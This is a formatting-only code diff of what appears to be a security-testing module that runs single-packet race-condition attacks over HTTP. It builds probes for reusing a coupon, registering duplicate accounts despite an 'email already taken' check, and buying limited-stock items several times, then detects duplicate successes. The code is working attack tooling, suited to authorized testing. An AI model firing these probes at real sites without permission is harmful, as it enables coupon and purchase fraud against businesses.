@@ -61,26 +61,28 @@ logger = logging.getLogger("amoskys.argos.race.single_packet")
 
 @dataclass
 class SinglePacketProbe:
-    name: str                        # human label e.g. "coupon_SAVE20"
+    name: str  # human label e.g. "coupon_SAVE20"
     target_url: str
     n_parallel: int = 20
-    mode: str = "h1_lastbyte"        # "h1_lastbyte" or "h2_multiplex"
+    mode: str = "h1_lastbyte"  # "h1_lastbyte" or "h2_multiplex"
     method: str = "POST"
     path: str = "/"
     headers: Dict[str, str] = field(default_factory=dict)
-    body_template: str = ""          # may contain {i} for per-request variation
-    varying_field_values: Optional[List[str]] = None  # overrides {i} with explicit values
+    body_template: str = ""  # may contain {i} for per-request variation
+    varying_field_values: Optional[List[str]] = (
+        None  # overrides {i} with explicit values
+    )
 
     def to_dict(self):
         return {
-            "name":           self.name,
-            "target_url":     self.target_url,
-            "n_parallel":     self.n_parallel,
-            "mode":           self.mode,
-            "method":         self.method,
-            "path":           self.path,
-            "headers":        dict(self.headers),
-            "body_template":  self.body_template,
+            "name": self.name,
+            "target_url": self.target_url,
+            "n_parallel": self.n_parallel,
+            "mode": self.mode,
+            "method": self.method,
+            "path": self.path,
+            "headers": dict(self.headers),
+            "body_template": self.body_template,
             "varying_field_values": list(self.varying_field_values or []),
         }
 
@@ -100,25 +102,28 @@ class SinglePacketReport:
 
     def to_dict(self):
         return {
-            "probe_name":                 self.probe_name,
-            "target":                     self.target,
-            "requests_sent":              self.requests_sent,
-            "responses":                  list(self.responses),
-            "unique_response_buckets":    self.unique_response_buckets,
-            "bucket_details":             dict(self.bucket_details),
+            "probe_name": self.probe_name,
+            "target": self.target,
+            "requests_sent": self.requests_sent,
+            "responses": list(self.responses),
+            "unique_response_buckets": self.unique_response_buckets,
+            "bucket_details": dict(self.bucket_details),
             "detected_duplicate_success": self.detected_duplicate_success,
-            "evidence":                   list(self.evidence),
-            "errors":                     list(self.errors),
+            "evidence": list(self.evidence),
+            "errors": list(self.errors),
         }
 
 
 # ── Pre-built probes ──────────────────────────────────────────────
 
 
-def build_coupon_race(target_url: str, coupon_code: str,
-                      cart_endpoint: str = "/apply-coupon",
-                      session_cookie: str = "",
-                      n_parallel: int = 20) -> SinglePacketProbe:
+def build_coupon_race(
+    target_url: str,
+    coupon_code: str,
+    cart_endpoint: str = "/apply-coupon",
+    session_cookie: str = "",
+    n_parallel: int = 20,
+) -> SinglePacketProbe:
     """Race coupon redemption — the classic.
 
     Classic bug: server checks `coupon.uses_remaining > 0` then
@@ -128,23 +133,30 @@ def build_coupon_race(target_url: str, coupon_code: str,
     """
     headers = {
         "Content-Type": "application/x-www-form-urlencoded",
-        "Connection":   "keep-alive",
+        "Connection": "keep-alive",
     }
     if session_cookie:
         headers["Cookie"] = session_cookie
     body = f"coupon_code={urllib.parse.quote(coupon_code)}"
     return SinglePacketProbe(
         name=f"coupon_{coupon_code}",
-        target_url=target_url, path=cart_endpoint, method="POST",
-        headers=headers, body_template=body,
-        n_parallel=n_parallel, mode="h1_lastbyte",
+        target_url=target_url,
+        path=cart_endpoint,
+        method="POST",
+        headers=headers,
+        body_template=body,
+        n_parallel=n_parallel,
+        mode="h1_lastbyte",
     )
 
 
-def build_registration_race(target_url: str, email: str,
-                            register_endpoint: str = "/register",
-                            username_prefix: str = "race",
-                            n_parallel: int = 20) -> SinglePacketProbe:
+def build_registration_race(
+    target_url: str,
+    email: str,
+    register_endpoint: str = "/register",
+    username_prefix: str = "race",
+    n_parallel: int = 20,
+) -> SinglePacketProbe:
     """Race registration — bypass "email already taken" check.
 
     Business logic bug: if check-then-insert is non-atomic, N parallel
@@ -156,32 +168,44 @@ def build_registration_race(target_url: str, email: str,
     body = f"email={urllib.parse.quote(email)}&username={{i}}&password=RaceTest123"
     return SinglePacketProbe(
         name=f"registration_{email}",
-        target_url=target_url, path=register_endpoint, method="POST",
-        headers={"Content-Type": "application/x-www-form-urlencoded",
-                 "Connection":   "keep-alive"},
+        target_url=target_url,
+        path=register_endpoint,
+        method="POST",
+        headers={
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Connection": "keep-alive",
+        },
         body_template=body,
         varying_field_values=values,
-        n_parallel=n_parallel, mode="h1_lastbyte",
+        n_parallel=n_parallel,
+        mode="h1_lastbyte",
     )
 
 
-def build_parallel_purchase_race(target_url: str, product_id: str,
-                                  purchase_endpoint: str = "/buy",
-                                  session_cookie: str = "",
-                                  n_parallel: int = 10) -> SinglePacketProbe:
+def build_parallel_purchase_race(
+    target_url: str,
+    product_id: str,
+    purchase_endpoint: str = "/buy",
+    session_cookie: str = "",
+    n_parallel: int = 10,
+) -> SinglePacketProbe:
     """Race limited-inventory purchase — buy N of product with stock=1."""
     headers = {
         "Content-Type": "application/x-www-form-urlencoded",
-        "Connection":   "keep-alive",
+        "Connection": "keep-alive",
     }
     if session_cookie:
         headers["Cookie"] = session_cookie
     body = f"product_id={urllib.parse.quote(product_id)}&quantity=1"
     return SinglePacketProbe(
         name=f"purchase_{product_id}",
-        target_url=target_url, path=purchase_endpoint, method="POST",
-        headers=headers, body_template=body,
-        n_parallel=n_parallel, mode="h1_lastbyte",
+        target_url=target_url,
+        path=purchase_endpoint,
+        method="POST",
+        headers=headers,
+        body_template=body,
+        n_parallel=n_parallel,
+        mode="h1_lastbyte",
     )
 
 
@@ -195,9 +219,11 @@ def _build_h1_requests(probe: SinglePacketProbe, host: str) -> List[bytes]:
     for i in range(probe.n_parallel):
         val = values[i] if i < len(values) else values[-1]
         body = probe.body_template.format(i=val)
-        hdr_lines = [f"{probe.method} {probe.path} HTTP/1.1",
-                     f"Host: {host}",
-                     f"Content-Length: {len(body)}"]
+        hdr_lines = [
+            f"{probe.method} {probe.path} HTTP/1.1",
+            f"Host: {host}",
+            f"Content-Length: {len(body)}",
+        ]
         for k, v in probe.headers.items():
             hdr_lines.append(f"{k}: {v}")
         raw = ("\r\n".join(hdr_lines) + "\r\n\r\n" + body).encode("utf-8")
@@ -233,9 +259,11 @@ def _h2_frame(frame_type: int, flags: int, stream_id: int, payload: bytes) -> by
 # ── Execute single-packet attack ──────────────────────────────────
 
 
-def execute_single_packet(probe: SinglePacketProbe,
-                           timeout: float = 10.0,
-                           raw_sender: Optional[Callable] = None) -> SinglePacketReport:
+def execute_single_packet(
+    probe: SinglePacketProbe,
+    timeout: float = 10.0,
+    raw_sender: Optional[Callable] = None,
+) -> SinglePacketReport:
     """Fire the probe.
 
     raw_sender(host, port, use_tls, requests: List[bytes], final_bytes: List[bytes],
@@ -246,8 +274,9 @@ def execute_single_packet(probe: SinglePacketProbe,
     host = p.hostname or ""
     use_tls = p.scheme == "https"
     port = p.port or (443 if use_tls else 80)
-    report = SinglePacketReport(probe_name=probe.name,
-                                 target=f"{probe.target_url}{probe.path}")
+    report = SinglePacketReport(
+        probe_name=probe.name, target=f"{probe.target_url}{probe.path}"
+    )
 
     requests = _build_h1_requests(probe, host)
 
@@ -261,9 +290,13 @@ def execute_single_packet(probe: SinglePacketProbe,
             return report
         report.requests_sent = len(requests)
         for status, body_shape, elapsed in results:
-            report.responses.append({
-                "status": status, "body_shape": body_shape, "elapsed_ms": elapsed,
-            })
+            report.responses.append(
+                {
+                    "status": status,
+                    "body_shape": body_shape,
+                    "elapsed_ms": elapsed,
+                }
+            )
     else:
         # Live execution — last-byte synchronization over keep-alive
         try:
@@ -298,15 +331,20 @@ def execute_single_packet(probe: SinglePacketProbe,
             blocks = data.split(b"HTTP/1.1 ")[1:]
             for b in blocks:
                 try:
-                    status_line = b.split(b"\r\n", 1)[0].decode("utf-8", errors="replace")
+                    status_line = b.split(b"\r\n", 1)[0].decode(
+                        "utf-8", errors="replace"
+                    )
                     status = int(status_line.split(" ", 1)[0])
                 except Exception:
                     status = 0
                 body_shape = _body_shape(b)
-                report.responses.append({
-                    "status": status, "body_shape": body_shape,
-                    "elapsed_ms": int((time.time() - t0) * 1000),
-                })
+                report.responses.append(
+                    {
+                        "status": status,
+                        "body_shape": body_shape,
+                        "elapsed_ms": int((time.time() - t0) * 1000),
+                    }
+                )
         except Exception as exc:  # noqa: BLE001
             report.errors.append(f"live execution error: {exc}")
             return report
@@ -321,7 +359,8 @@ def execute_single_packet(probe: SinglePacketProbe,
 
     # Detect duplicate success: >1 response has status 200 with similar body
     success_count = sum(
-        c for k, c in buckets.items()
+        c
+        for k, c in buckets.items()
         if k.startswith("200:") or k.startswith("201:") or k.startswith("302:")
     )
     if success_count > 1:
@@ -342,18 +381,22 @@ def _body_shape(raw: bytes) -> str:
     """Hash the first 200 body bytes into a short signature for
     bucketing. Trims numbers to normalize incrementing IDs."""
     import re as _re
+
     parts = raw.split(b"\r\n\r\n", 1)
     body = parts[1] if len(parts) == 2 else b""
     sample = body[:200].decode("utf-8", errors="replace")
     # Normalize numbers
     norm = _re.sub(r"\d+", "N", sample)
     import hashlib as _h
+
     return _h.md5(norm.encode()).hexdigest()[:12]
 
 
 __all__ = [
-    "SinglePacketProbe", "SinglePacketReport",
-    "build_coupon_race", "build_registration_race",
+    "SinglePacketProbe",
+    "SinglePacketReport",
+    "build_coupon_race",
+    "build_registration_race",
     "build_parallel_purchase_race",
     "execute_single_packet",
 ]
